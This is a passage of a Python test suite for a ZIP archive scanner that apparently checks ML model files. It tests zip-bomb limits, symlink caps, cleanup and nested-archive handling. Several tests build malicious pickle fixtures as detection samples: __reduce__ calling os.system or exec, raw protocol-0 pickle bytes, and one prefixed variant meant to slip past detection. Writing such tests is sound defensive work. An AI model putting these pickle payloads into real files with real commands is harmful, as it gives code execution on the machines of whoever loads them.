        for audit_result in (first_result, second_result):
            metadata = audit_result.file_metadata[str(archive_path)]
            assert audit_result.success is True
            assert audit_result.has_errors is False
            assert core.determine_exit_code(audit_result) == 1
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert metadata["analysis_incomplete"] is True
            assert "zip_analysis_incomplete" in metadata["scan_outcome_reasons"]
            assert metadata["archive_uncompressed_size"] == 16
            assert any("ZIP total uncompressed size exceeds limit" in issue.message for issue in audit_result.issues)

    def test_core_zip_partial_nested_scan_without_findings_returns_exit_code_2(self, tmp_path: Path) -> None:
        """A failed nested ZIP member scan with no finding should stay inconclusive in aggregate output."""
        archive_path = tmp_path / "nested_failure.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("member.bin", b"payload")

        def nested_scan(_path: str, _config: dict[str, Any]) -> ScanResult:
            nested_result = ScanResult(scanner_name="test_nested")
            nested_result.finish(success=False)
            return nested_result

        scan_kwargs: dict[str, Any] = {NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan}
        audit_result = core.scan_model_directory_or_file(
            str(archive_path),
            cache_enabled=False,
            **scan_kwargs,
        )

        metadata = audit_result.file_metadata[str(archive_path)]
        assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert metadata["analysis_incomplete"] is True
        assert audit_result.success is False
        assert core.determine_exit_code(audit_result) == 2

    def test_zip_nested_critical_finding_does_not_mark_archive_incomplete(self, tmp_path: Path) -> None:
        """Real nested findings should fail the archive without claiming partial traversal."""
        archive_path = tmp_path / "nested_critical.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("model.pkl", b"payload")

        def nested_scan(path: str, _config: dict[str, Any]) -> ScanResult:
            nested_result = ScanResult(scanner_name="test_nested")
            nested_result.add_check(
                name="Nested Critical Finding",
                passed=False,
                message="Nested member is malicious",
                severity=IssueSeverity.CRITICAL,
                location=path,
            )
            nested_result.finish(success=False)
            return nested_result

        result = ZipScanner(config={NESTED_SCAN_CALLBACK_CONFIG_KEY: nested_scan}).scan(str(archive_path))

        assert result.success is False
        assert result.has_errors is True
        assert "scan_outcome" not in result.metadata
        assert result.metadata.get("analysis_incomplete") is not True
        assert any(check.name == "Nested Critical Finding" for check in result.checks)

    def test_zip_incomplete_metadata_survives_cache_roundtrip(self, tmp_path: Path) -> None:
        """Cache conversion should preserve explicit partial-archive outcome metadata."""
        archive_path = tmp_path / "cached_many_entries.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("one.txt", "one")
            archive.writestr("two.txt", "two")

        config = {
            "cache_enabled": True,
            "cache_dir": str(tmp_path / "scan-cache"),
            "max_zip_entries": 1,
        }

        first_result = core.scan_file(str(archive_path), config=config)
        second_result = core.scan_file(str(archive_path), config=config)

        assert first_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "zip_analysis_incomplete" in first_result.metadata["scan_outcome_reasons"]
        assert second_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "zip_analysis_incomplete" in second_result.metadata["scan_outcome_reasons"]

    def test_oversized_symlink_target_fails_closed(self, tmp_path: Path) -> None:
        """Symlink targets should be read with a bounded cap instead of being silently trusted."""
        import stat

        archive_path = tmp_path / "oversized_symlink.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            info = zipfile.ZipInfo("link.txt")
            info.create_system = 3
            info.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(info, "a" * (ZipScanner.MAX_SYMLINK_TARGET_BYTES + 1))

        result = self.scanner.scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "Symlink Safety Validation"
            and check.status == CheckStatus.FAILED
            and "symlink target exceeds maximum size" in check.message.lower()
            and check.details.get("entry") == "link.txt"
            for check in result.checks
        )

    def test_oversized_entry_cleanup_removes_partial_temp_file(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Entry extraction failures should not leave partial temp files behind."""
        scratch_dir = tmp_path / "scratch"
        scratch_dir.mkdir()
        monkeypatch.setattr(tempfile, "tempdir", str(scratch_dir))

        archive_path = tmp_path / "oversized_entry.zip"
        with zipfile.ZipFile(archive_path, "w") as archive:
            archive.writestr("big.bin", b"A" * 32)

        result = ZipScanner(config={"max_entry_size": 8}).scan(str(archive_path))

        assert result.success is False
        assert any(
            check.name == "ZIP Entry Scan"
            and check.status == CheckStatus.FAILED
            and "exceeds maximum size" in check.message
            and check.details.get("entry") == "big.bin"
            for check in result.checks
        )
        assert list(scratch_dir.iterdir()) == []

    def test_scan_zip_with_dangerous_pickle(self):
        """Test scanning a ZIP file containing a dangerous pickle"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            with zipfile.ZipFile(tmp.name, "w") as z:
                # Create a pickle with suspicious content
                import os as os_module
                import pickle

                class DangerousClass:
                    def __reduce__(self) -> tuple[Callable[..., Any], tuple[Any, ...]]:
                        return (os_module.system, ("echo pwned",))

                dangerous_obj = DangerousClass()
                pickle_data = pickle.dumps(dangerous_obj)
                z.writestr("dangerous.pkl", pickle_data)
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            # Security findings in nested members should propagate to top-level success.
            assert result.success is False
            assert result.has_errors is True

            # Check that we at least tried to scan the pickle
            assert result.bytes_scanned > 0

            # May have error issues due to the bug in pickle scanner with string_stack
            # or it may detect the dangerous content
            # Either way, it should have scanned the file
        finally:
            os.unlink(tmp_path)

    def test_scan_zip_with_proto0_pickle_disguised_as_text(self, tmp_path: Path) -> None:
        """Protocol 0 pickle in .txt entry should still be detected as pickle content."""
        archive_path = tmp_path / "proto0_payload.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("payload.txt", b'cos\nsystem\n(S"echo pwned"\ntR.')

        result = self.scanner.scan(str(archive_path))
        assert result.success is False
        assert result.has_errors is True

        critical_messages = [
            issue.message.lower() for issue in result.issues if issue.severity == IssueSeverity.CRITICAL
        ]
        assert any("os.system" in msg or "posix.system" in msg for msg in critical_messages), (
            f"Expected critical os/posix.system issue, got: {critical_messages}"
        )

    def test_scan_zip_with_prefixed_proto0_pickle_disguised_as_text(self, tmp_path: Path) -> None:
        """Protocol 0 pickles with MARK/LIST prefixes in .txt entries should be detected."""
        archive_path = tmp_path / "proto0_prefixed_payload.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("payload.txt", b'(lp0\n0cos\nsystem\n(S"echo pwned"\ntR.')

        result = self.scanner.scan(str(archive_path))
        assert result.success is False
        assert result.has_errors is True

        critical_messages = [
            issue.message.lower() for issue in result.issues if issue.severity == IssueSeverity.CRITICAL
        ]
        assert any("os.system" in msg or "posix.system" in msg for msg in critical_messages), (
            f"Expected critical os/posix.system issue, got: {critical_messages}"
        )

    def test_scan_npz_with_object_member_recurses_into_pickle(self, tmp_path: Path) -> None:
        import numpy as np

        class _ExecPayload:
            def __reduce__(self) -> tuple[Callable[..., Any], tuple[Any, ...]]:
                return (exec, ("print('owned')",))

        archive_path = tmp_path / "payload.npz"
        np.savez(archive_path, safe=np.arange(3), payload=np.array([_ExecPayload()], dtype=object))

        result = self.scanner.scan(str(archive_path))
        assert result.success is False

        failed_checks = [c for c in result.checks if c.status.value == "failed"]
        assert any("cve-2019-6446" in (c.name + c.message).lower() for c in failed_checks)
        assert any(
            c.details.get("zip_entry") == "payload.npy" and c.location == f"{archive_path}:payload.npy"
            for c in failed_checks
        ), f"Expected rewritten check context for payload.npy, got: {[(c.location, c.details) for c in failed_checks]}"
        assert any("exec" in i.message.lower() and i.details.get("zip_entry") == "payload.npy" for i in result.issues)

    def test_scan_outer_zip_preserves_nested_npz_member_context(self, tmp_path: Path) -> None:
        import numpy as np

        class _ExecPayload:
            def __reduce__(self) -> tuple[Callable[..., Any], tuple[Any, ...]]:
                return (exec, ("print('owned')",))

        inner_npz = tmp_path / "inner.npz"
        np.savez(
            inner_npz,
            payload_a=np.array([_ExecPayload()], dtype=object),
            payload_b=np.array([_ExecPayload()], dtype=object),
        )

        archive_path = tmp_path / "outer.zip"
        with zipfile.ZipFile(archive_path, "w") as zf:
            zf.write(inner_npz, arcname="inner.npz")

        result = self.scanner.scan(str(archive_path))
        failed_checks = [c for c in result.checks if c.status.value == "failed"]

        assert any(
            c.details.get("zip_entry") == "inner.npz:payload_a.npy"
            and c.location
            and f"{archive_path}:inner.npz:payload_a.npy" in c.location
            for c in failed_checks
        )
        assert any(
            c.details.get("zip_entry") == "inner.npz:payload_b.npy"
            and c.location
            and f"{archive_path}:inner.npz:payload_b.npy" in c.location
            for c in failed_checks
        )

    def test_scan_zip_with_plain_text_global_prefix_not_treated_as_pickle(self, tmp_path: Path) -> None:
        """Plain text entries that start with GLOBAL-like bytes should not trigger pickle parse warnings."""
        archive_path = tmp_path / "plain_text_payload.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("notes.txt", b"c\nthis is plain text\nnot a pickle stream")

        result = self.scanner.scan(str(archive_path))
        assert result.success is True
        noisy_pickle_warnings = [
            issue for issue in result.issues if "incomplete or corrupted pickle file" in issue.message.lower()
        ]
        assert not noisy_pickle_warnings, (
            f"Expected no noisy pickle warning for plain text, got: {[i.message for i in noisy_pickle_warnings]}"
        )

    def test_scan_zip_with_proto0_pickle_with_single_comment_token_bypass_regression(self, tmp_path: Path) -> None:
        """Single comment-token prefix must not suppress proto0 payload detection."""
        archive_path = tmp_path / "proto0_comment_prefixed_payload.zip"
        payload = b"#" + b'cos\nsystem\n(S"echo pwned"\ntR.'
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("payload.txt", payload)

        result = self.scanner.scan(str(archive_path))
        assert result.success is False
        assert result.has_errors is True

        critical_messages = [
            issue.message.lower() for issue in result.issues if issue.severity == IssueSeverity.CRITICAL
        ]
        assert any("os.system" in msg or "posix.system" in msg for msg in critical_messages), (
            f"Expected critical os/posix.system issue, got: {critical_messages}"
        )

    def test_scan_nonexistent_file(self):
        """Test scanning a file that doesn't exist"""
        result = self.scanner.scan("/nonexistent/file.zip")
        assert result.success is False
        assert len(result.issues) > 0
        assert any("does not exist" in issue.message for issue in result.issues)

    def test_scan_invalid_zip(self):
        """Test scanning a file that's not a valid ZIP"""
        with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
            tmp.write(b"This is not a zip file")
            tmp_path = tmp.name

        try:
            result = self.scanner.scan(tmp_path)
            assert result.success is False
            assert len(result.issues) > 0
            assert any("not a valid zip" in issue.message.lower() for issue in result.issues)
        finally:
            os.unlink(tmp_path)

    def test_scan_empty_zip(self, tmp_path: Path) -> None:
        """An empty ZIP archive should scan successfully with no critical issues."""
        archive_path = tmp_path / "empty.zip"
        with zipfile.ZipFile(archive_path, "w"):
            pass  # empty archive

        result = self.scanner.scan(str(archive_path))

        assert result.success is True
        assert result.bytes_scanned == 0
        critical_issues = [i for i in result.issues if i.severity == IssueSeverity.CRITICAL]
        assert len(critical_issues) == 0

    def test_scan_zip_with_multiple_model_formats(self, tmp_path: Path) -> None:
        """ZIP containing multiple model-format files should scan all of them."""
        import pickle

        archive_path = tmp_path / "multi_format.zip"

        pkl_data = pickle.dumps({"weights": [1, 2, 3]})
        json_data = b'{"model_type": "linear", "version": "1.0"}'
        pt_data = pickle.dumps({"state_dict": {}})  # .pt files are pickle-based

        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("model.pkl", pkl_data)
            z.writestr("config.json", json_data)
            z.writestr("weights.pt", pt_data)

        result = self.scanner.scan(str(archive_path))

        assert result.success is True
        # All three file payloads should have been scanned
        assert result.bytes_scanned == len(pkl_data) + len(json_data) + len(pt_data)
        contents_paths = {c.get("path", "") for c in result.metadata.get("contents", [])}
        assert any("model.pkl" in p for p in contents_paths)
        assert any("config.json" in p for p in contents_paths)
        assert any("weights.pt" in p for p in contents_paths)

    def test_scan_zip_with_very_long_filename(self, tmp_path: Path) -> None:
        """ZIP entries with very long filenames should be handled without crashing."""
        import pickle

        archive_path = tmp_path / "long_name.zip"
        long_name = "a" * 200 + ".pkl"  # 204-character filename
        payload = pickle.dumps({"key": "value"})

        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr(long_name, payload)

        result = self.scanner.scan(str(archive_path))

        # Scan must not crash; success is expected for a benign payload
        assert result.success is True
        assert result.bytes_scanned == len(payload)

    def test_scan_truncated_zip(self, tmp_path: Path) -> None:
        """A truncated (corrupted) ZIP file should fail gracefully."""
        archive_path = tmp_path / "valid.zip"
        with zipfile.ZipFile(archive_path, "w") as z:
            z.writestr("file.txt", "some content")

        full_data = archive_path.read_bytes()
        truncated_path = tmp_path / "truncated.zip"
        truncated_path.write_bytes(full_data[: len(full_data) // 2])

        result = self.scanner.scan(str(truncated_path))

        # A truncated archive is invalid — scan must not raise an unhandled exception
        assert result.success is False
        assert len(result.issues) > 0
